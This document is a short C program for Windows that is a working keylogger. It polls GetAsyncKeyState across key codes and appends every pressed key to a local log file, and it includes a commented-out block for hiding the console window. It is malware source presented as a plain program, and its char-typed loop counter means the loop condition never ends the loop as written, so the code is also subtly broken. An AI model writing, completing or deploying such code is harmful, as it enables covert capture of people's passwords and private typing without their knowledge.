#include <stdio.h>
#include <conio.h>
#include <windows.h>
#include <time.h>

int main() {
  //hide console
/*
  HWND hWnd;
  AllocConsole();
  hWnd = FindWindowA("ConsoleWindowClass", NULL);
  ShowWindow(hWnd, 0);
*/

  char Key;
  FILE *file;

  //open file
  file = fopen("C:/Users/mfsch/Desktop/log.txt", "a+");

  while (1) {
      Sleep(20); //sleep so that I dont use too much ressources
      for (Key = 8; Key <= 255; Key++) { //loop through ascii table
          if (GetAsyncKeyState(Key) == -32767) {
            fprintf(file, "%c",Key);
            fflush(file);
          }
      }
  }
}
